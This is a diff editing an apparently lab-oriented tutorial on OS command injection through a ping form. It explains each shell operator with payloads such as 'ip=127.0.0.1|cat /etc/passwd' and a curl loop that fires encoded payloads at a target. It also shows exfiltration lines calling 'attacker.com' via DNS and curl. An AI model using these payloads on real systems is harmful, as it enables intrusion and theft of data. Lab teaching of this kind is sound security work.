@@ -23,14 +23,15 @@ Run `ping -c 1 127.0.0.1 <OPERATOR> whoami` — see what comes back:
 
 ## Pipe (`|`) — Cleanest Injection Output
 
-Pipe pipes stdout of command 1 into command 2. Since `ping` outputs to stdout and `whoami` ignores stdin, you only see `whoami`'s output:
+The pipe (`|`) sends the standard output of the first command into the second command. Since `ping` writes to standard output and `whoami` ignores standard input, only `whoami`'s output appears:
 
 ```bash
 ping -c 1 127.0.0.1 | whoami
 # www-data    ← only whoami's output
 ```
+> The pipe discards `ping`'s output and passes it to `whoami`, which ignores it. Only `whoami`'s result is returned. Use `|` when you want clean output with no ping noise.
 
-Great for clean exfiltration when the response only shows the last command's output:
+Good for clean exfiltration when the response only shows the last command's output:
 ```
 ip=127.0.0.1|whoami        →  www-data
 ip=127.0.0.1|id            →  uid=33(www-data) gid=33(www-data)
@@ -41,15 +42,16 @@ ip=127.0.0.1|cat /etc/passwd
 
 ## `||` (OR) — Force the Injection by Failing First
 
-OR runs the second command **only if the first fails** (exit code ≠ 0). Useful when:
+The OR operator (`||`) runs the second command only if the first one fails (exit code is not zero). This is useful when:
 - You don't want the first command's output cluttering the response
-- The original command always fails anyway (e.g., you give a non-IP)
+- The original command always fails anyway (for example, if you give a non-IP value)
 
 ```bash
 ping -c 1 || whoami
 # ping: usage error: Destination address required
 # www-data
 ```
+> `ping -c 1` with no destination fails immediately. The `||` then triggers `whoami`. Use this pattern when you want only your command's output with no ping noise.
 
 Lab payload:
 ```
@@ -60,21 +62,22 @@ ip=||whoami     →  whoami runs cleanly because ping errors
 
 ## `&&` (AND) — Conditional Chain
 
-AND runs the second only if the first succeeds. Useful when:
+The AND operator (`&&`) runs the second command only if the first one succeeds. It is useful when:
 - You need a valid first command to avoid suspicion
-- The filter only allows valid input but doesn't filter operators
+- The filter only allows valid input but does not filter operators
 
 ```bash
 ping -c 1 127.0.0.1 && whoami
 # PING ... 1 packets received ...
 # www-data
 ```
+> Both commands run in sequence. `whoami` only runs if `ping` exits with code 0. Both outputs appear in the response.
 
 ---
 
 ## `&` (Background) — Async Execution
 
-`&` runs the first command in the background, then runs the second immediately. Output ordering is unpredictable — usually second appears first because background ping takes longer.
+The `&` operator runs the first command in the background and immediately starts the second. Output order is unpredictable — usually the second command's output appears first because the background ping takes longer.
 
 ```bash
 ping -c 1 127.0.0.1 & whoami
@@ -82,6 +85,7 @@ ping -c 1 127.0.0.1 & whoami
 # PING ... time=0.065 ms
 # 1 packets transmitted, 1 received
 ```
+> `ping` starts in the background (`&`). `whoami` runs immediately and returns its output first. Useful when you want fast injection output without waiting for the first command to finish.
 
 Useful when:
 - You want fast injection output (don't wait for ping to finish)
@@ -91,24 +95,27 @@ Useful when:
 
 ## Inline Substitution — `` `cmd` `` and `$(cmd)`
 
-Bash evaluates the substitution and replaces it with the output, **then** runs the surrounding command.
+Bash evaluates the substitution first and replaces it with the output. Then it runs the surrounding command with that output inserted.
 
 ```bash
 ping -c 1 `whoami`    →  ping -c 1 www-data    (fails — not an IP)
 ping -c 1 $(whoami)   →  ping -c 1 www-data    (fails)
 ```
+> Backticks (`` ` ``) and `$()` are equivalent — both run the inner command and substitute its output. `$()` is preferred because it nests cleanly and is easier to read.
 
 For these to be useful, the substituted command needs to return something the outer command accepts:
 ```bash
 ping -c 1 $(hostname)     # hostname returns a valid hostname → ping succeeds
 echo "result: $(whoami)"  # → result: www-data
 ```
+> `$(hostname)` returns a resolvable name, so ping succeeds. Use inline substitution when the server reflects error output or you need the injected result inside another command's arguments.
 
-Useful for **blind injection** where you want command output sent over the network:
+Useful for blind injection where you want command output sent over the network:
 ```bash
 ping -c 1 $(whoami).attacker.com   # DNS query goes out as "www-data.attacker.com"
 curl http://attacker.com/$(id|base64)  # exfil via HTTP
 ```
+> The DNS lookup for `www-data.attacker.com` leaks the username. The `curl` path leaks the full `id` output base64-encoded. Both techniques work even when the server does not display command output directly.
 
 ---
 
@@ -138,6 +145,7 @@ for payload in "127.0.0.1%0awhoami" "127.0.0.1+%26+whoami" "127.0.0.1+%7c+whoami
   curl -sk -X POST "http://TARGET/" -d "ip=$payload" | sed -n '/<pre>/,/<\/pre>/p'
 done
 ```
+> Tests newline (`%0a`), background (`%26`/`&`), and pipe (`%7c`/`|`) operators in one loop. `sed` extracts only the `<pre>` response block. Replace `TARGET` with the lab IP:port.
 
 Output comparison:
 
